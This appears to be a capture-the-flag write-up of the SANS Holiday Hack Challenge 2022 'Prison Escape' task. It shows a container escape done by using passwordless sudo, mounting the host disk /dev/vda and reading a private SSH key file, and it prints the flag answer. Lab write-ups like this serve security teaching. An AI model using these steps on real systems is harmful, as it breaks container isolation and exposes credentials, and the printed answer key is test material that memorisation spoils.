# Recover the Elfen Ring: Prison Escape  
**SANS Holiday Hack Challenge 2022 – KringleCon V: Golden Rings**  
**Difficulty:** 🎄🎄🎄

## Overview  
In this challenge, I had to escape from a containerized environment and locate a secret hex string hidden in a file on the host system. Hints suggested that mounting host devices and leveraging over-permissioned containers might allow access to sensitive files outside the jail.

---

## Steps Performed

### 1. Check for Privileged Access  
Immediately attempted `sudo`, which worked without prompting for a password—confirming the container had elevated privileges.

---

### 2. Investigate Attached Devices  
Using `fdisk -l`, I discovered the container had access to `/dev/vda`, a virtual disk device:

```bash
fdisk -l
```

Output:
```
Disk /dev/vda: 2048 MB, ...
```

---

### 3. Mount the Host Filesystem  
Following the hint about mounting, I mounted `/dev/vda` to `/mnt`:

```bash
mount /dev/vda /mnt
mount | grep vda
```

This revealed a full Linux root file structure from the host:
```
/mnt/bin /mnt/boot /mnt/home /mnt/root ...
```

---

### 4. Locate the Target File  
Navigated to the expected location:

```bash
ls /mnt/home/jailer/.ssh/
cat /mnt/home/jailer/.ssh/jail.key.priv
```

The file was present and contained the private key. To extract the relevant hex string:

```bash
cat /mnt/home/jailer/.ssh/jail.key.priv | tail -n 11 | head -n 1 | cut -d " " -f 11
```

---

###  Final Answer  
**Hex string found:**  
```
082bb339ec19de4935867
```

This confirmed the solution.

---

## Outcome  
By exploiting container over-permissioning and mounting the host disk, I successfully escaped the container and accessed the host file system. The hex string was retrieved from the target SSH key file, completing the challenge.
